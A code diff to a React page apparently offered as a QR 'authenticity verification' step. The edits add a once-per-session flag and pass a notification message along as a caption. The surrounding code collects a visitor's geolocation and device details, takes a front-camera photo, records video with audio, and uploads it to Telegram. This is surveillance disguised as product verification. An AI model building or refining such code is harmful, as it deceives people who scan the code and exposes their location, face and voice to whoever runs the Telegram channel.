@@ -13,11 +13,12 @@ type QrVerifyPageProps = {
   params: { lang: string };
 };
 
-const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed params to _params
+const QR_SCAN_SESSION_KEY = 'samyunwan_qr_scan_notified';
+
+const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
   const searchParams = useSearchParams();
   const pathname = usePathname();
   const { t } = useLayoutContext();
-  // Removed: const currentLang = params.lang; // This variable is no longer directly used
 
   const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.processingRequest);
   const [error, setError] = useState<string | null>(null);
@@ -34,7 +35,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
 
   const stopCamera = useCallback(() => {
     if (stream) {
-      stream.getTracks().forEach(track => track.stop());
+      stream.getTracks().forEach((track: MediaStreamTrack) => track.stop());
       setStream(null);
     }
     if (videoRef.current) {
@@ -44,6 +45,14 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
   }, [stream]);
 
   const startVerificationProcess = useCallback(async () => {
+    // Check session storage to prevent multiple runs
+    if (sessionStorage.getItem(QR_SCAN_SESSION_KEY) === 'true') {
+      console.log("QR verification already processed in this session.");
+      setIsLoading(false);
+      setStatusMessage(t.authenticity.qrScanSuccess); // Or a message indicating it was already done
+      return;
+    }
+
     setIsLoading(true);
     setError(null);
     setRecordedChunks([]);
@@ -52,6 +61,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
 
     let geoLat: number | null = null;
     let geoLon: number | null = null;
+    let initialCaption = '';
 
     try {
       // 1. Get Geolocation
@@ -94,7 +104,8 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
         cpuArchitecture,
         clientTimezone,
       };
-      const initialCaption = await notifyVisit(bodyData, utmQueryParams);
+      const notifyResponse = await notifyVisit(bodyData, utmQueryParams);
+      initialCaption = notifyResponse; // Capture the message returned by notifyVisit
       setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");
 
       // 4. Request Camera Access (front camera first)
@@ -122,7 +133,8 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
         await videoRef.current.play();
       }
 
-      await new Promise(resolve => setTimeout(resolve, 1000)); 
+      // IMPORTANT: Add a small delay to allow the video stream to render a frame
+      await new Promise(resolve => setTimeout(resolve, 500)); 
 
       // 5. Take Photo
       setStatusMessage(t.authenticity.processingRequest + " (Taking photo...)");
@@ -154,9 +166,9 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
       const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
       setMediaRecorder(recorder);
 
-      recorder.ondataavailable = (event: BlobEvent) => { // Explicitly type event as BlobEvent
+      recorder.ondataavailable = (event: BlobEvent) => {
         if (event.data.size > 0) {
-          setRecordedChunks((prev: Blob[]) => [...prev, event.data]); // Explicitly type prev as Blob[]
+          setRecordedChunks((prev: Blob[]) => [...prev, event.data]);
         }
       };
 
@@ -173,6 +185,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
           await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
           showSuccess(t.authenticity.recordingSuccess);
           setStatusMessage(t.authenticity.recordingSuccess);
+          sessionStorage.setItem(QR_SCAN_SESSION_KEY, 'true'); // Set flag on successful completion
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
           showError(t.authenticity.recordingError);
@@ -213,6 +226,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
   }, [searchParams, pathname, t, stopCamera, recordedChunks]);
 
   useEffect(() => {
+    // Call startVerificationProcess only once on mount
     startVerificationProcess();
 
     return () => {
@@ -224,7 +238,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => { // Renamed pa
         URL.revokeObjectURL(videoPreviewUrl);
       }
     };
-  }, [startVerificationProcess, mediaRecorder, videoPreviewUrl, stopCamera]);
+  }, [startVerificationProcess]); // Dependency array now only includes startVerificationProcess
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
